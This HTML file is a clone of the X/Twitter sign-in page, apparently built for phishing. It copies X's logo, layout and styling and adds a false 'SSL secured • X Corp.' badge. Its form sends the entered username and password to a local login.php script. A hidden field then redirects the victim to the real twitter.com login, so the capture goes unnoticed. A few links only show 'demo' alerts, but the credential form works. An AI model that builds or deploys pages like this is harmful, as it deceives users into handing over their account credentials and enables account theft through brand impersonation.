<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X / Twitter</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 380px;
            width: 100%;
            background: #000000;
            border: 1px solid #2f3336;
            border-radius: 16px;
            padding: 32px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo svg {
            width: 40px;
            height: 40px;
            fill: #ffffff;
        }
        
        .logo h2 {
            color: #e7e9ea;
            font-size: 31px;
            font-weight: 700;
            margin-top: 20px;
            text-align: left;
        }
        
        .card form {
            display: flex;
            flex-direction: column;
        }
        
        .card input {
            height: 56px;
            background: #000000;
            border: 1px solid #2f3336;
            border-radius: 4px;
            font-size: 16px;
            padding: 0 16px;
            margin-bottom: 16px;
            color: #e7e9ea;
            transition: all 0.2s;
        }
        
        .card input:focus {
            outline: none;
            border-color: #1d9bf0;
        }
        
        .card input::placeholder {
            color: #5b5f63;
        }
        
        .card button {
            background: #ffffff;
            border: none;
            border-radius: 9999px;
            font-size: 16px;
            font-weight: 700;
            color: #000000;
            height: 48px;
            cursor: pointer;
            margin: 8px 0 16px;
            transition: background 0.2s;
        }
        
        .card button:hover {
            background: #e6e6e6;
        }
        
        .forgot-btn {
            background: transparent;
            border: 1px solid #2f3336;
            border-radius: 9999px;
            font-size: 16px;
            font-weight: 700;
            color: #ffffff;
            height: 48px;
            cursor: pointer;
            margin: 8px 0 16px;
            transition: background 0.2s;
        }
        
        .forgot-btn:hover {
            background: #181818;
        }
        
        .divider {
            display: flex;
            align-items: center;
            color: #5b5f63;
            font-size: 14px;
            margin: 16px 0;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #2f3336;
        }
        
        .divider::before {
            margin-right: 8px;
        }
        
        .divider::after {
            margin-left: 8px;
        }
        
        .signup-link {
            text-align: center;
            font-size: 15px;
            color: #5b5f63;
            margin: 20px 0;
        }
        
        .signup-link a {
            color: #1d9bf0;
            text-decoration: none;
        }
        
        .signup-link a:hover {
            text-decoration: underline;
        }
        
        .footer {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-top: 30px;
            font-size: 13px;
        }
        
        .footer a {
            color: #5b5f63;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        input[type="hidden"] {
            display: none;
        }
        
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin: 20px 0 0;
            font-size: 12px;
            color: #5b5f63;
        }
        
        @media (max-width: 400px) {
            .container {
                padding: 20px;
            }
            
            .footer {
                gap: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- X logo -->
            <svg viewBox="0 0 24 24" aria-hidden="true">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
            </svg>
            <h2>Sign in to X</h2>
        </div>
        
        <div class="card">
            <form method="POST" action="/login.php" id="loginForm">
                <input type="hidden" name="redirect" value="https://twitter.com/login">
                
                <input type="text" name="username" placeholder="Phone, email, or username" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                
                <button type="submit">Next</button>
                
                <button type="button" class="forgot-btn" onclick="alert('Password reset demo'); return false;">Forgot password?</button>
            </form>
            
            <div class="divider">or</div>
            
            <div class="signup-link">
                Don't have an account? <a href="#" onclick="alert('Signup demo'); return false;">Sign up</a>
            </div>
            
            <div class="security-note">
                <span>🔒</span>
                <span>SSL secured</span>
                <span>•</span>
                <span>X Corp.</span>
            </div>
        </div>
        
        <div class="footer">
            <a href="#" onclick="alert('Terms demo'); return false;">Terms of Service</a>
            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy Policy</a>
            <a href="#" onclick="alert('Help demo'); return false;">Help Center</a>
            <a href="#" onclick="alert('Cookies demo'); return false;">Cookies</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            if (!username || !password) {
                e.preventDefault();
                alert('Please enter your username and password');
                return;
            }
        });
        
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#1d9bf0';
            });
            
            input.addEventListener('blur', function() {
                if (!this.value) {
                    this.style.borderColor = '#2f3336';
                }
            });
        });
        
        document.querySelector('input[name="username"]').addEventListener('input', function() {
            // X-style validation
        });
        
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
        
        window.addEventListener('load', function() {
            document.querySelector('input[name="username"]').focus();
        });
    </script>
</body>
</html>
